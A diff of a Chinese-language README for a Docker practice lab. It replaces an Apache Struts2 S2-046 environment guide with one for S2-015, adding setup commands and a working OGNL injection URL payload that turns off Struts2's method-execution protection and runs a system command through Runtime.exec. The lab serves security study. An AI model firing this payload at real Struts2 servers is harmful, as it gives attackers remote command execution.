@@ -1,21 +1,23 @@
-## Struts2_Jakarta_Plugin插件远程代码执行漏洞(S2-046) 环境
+## Struts2 S2-015 漏洞环境
 
 ### 漏洞信息
 
- * [S2-046 公告](https://cwiki.apache.org/confluence/display/WW/S2-046)
+ * [S2-015 公告](http://struts.apache.org/docs/s2-015.html)
+ 
+参考 [http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html)
 
 ### 获取环境:
 
 1. 拉取镜像到本地
 
  ```
-$ docker pull medicean/vulapps:s_struts2_s2-046
+$ docker pull medicean/vulapps:s_struts2_s2-015
  ```
 
 2. 启动环境
 
  ```
-$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-046
+$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-015
  ```
  > `-p 80:8080` 前面的 80 代表物理机的端口，可随意指定。 
 
@@ -23,29 +25,12 @@ $ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-046
 
 访问 `http://你的 IP 地址:端口号/`
 
-#### PoC
+#### Exp
 
-> 本例中使用 [Struts2_Jakarta_Plugin插件远程代码执行漏洞(S2-046) ](http://www.bugscan.net/source/plugin/4787/template/)
+命令执行
 
+```
+/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}.action
+```
 
-1. 下载并安装 `BugScan SDK`
-
- 详见 [BugScan 插件开发文档 - 环境配置](http://doc.bugscan.net/chapter1/1-1.html)
-
-2. 修改 `poc.py` 中地址为容器地址
-
- > 该漏洞无需配合上传表单使用
-
- ```
-if __name__ == '__main__':
-    from dummy import *
-    audit(assign(fingerprint.struts, 'http://127.0.0.1:8080/')[1])
-
- ```
-
-3. 运行 `poc.py`
-
- ```
-$ python poc.py
- ```
-
+![](s2-015-1.png)
